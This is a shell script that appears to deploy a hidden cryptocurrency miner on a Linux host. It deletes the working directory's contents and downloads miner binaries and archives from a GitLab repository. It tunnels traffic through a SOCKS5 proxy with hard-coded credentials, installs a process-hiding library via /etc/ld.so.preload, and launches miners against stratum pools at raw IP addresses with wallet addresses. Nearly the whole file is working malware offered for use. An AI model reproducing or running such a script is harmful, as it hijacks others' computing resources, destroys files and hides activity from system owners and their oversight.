rm -rvf * && mkdir d && cd d
#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl

sudo apt-get install -y nodejs

apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y

curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -

npm i -g node-process-hider

wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.84

chmod 777 lol1.84

wget https://gitlab.com/majapahlevi/mvp/-/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz


cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 209.97.145.189:443
socks5_username = majapahlevi
socks5_password = majapahlevi
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "


./graftcp/graftcp wget https://gitlab.com/majapahlevi/mvp/-/raw/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./lol1.84 --algo IRONFISH --pool stratum+tcp://161.35.141.255:80 --user 757ea84ec697775b5721d45cdc3a4e100ee0722a90ea359bcfd894f51c415b71+39077768391.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer
chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcp://138.197.12.20:80 -u v255vQEQnZj2NVjF3UHpTrtwA1cGdXt4dV.$(shuf -n 1 -i 1-99999)-VISH -t4
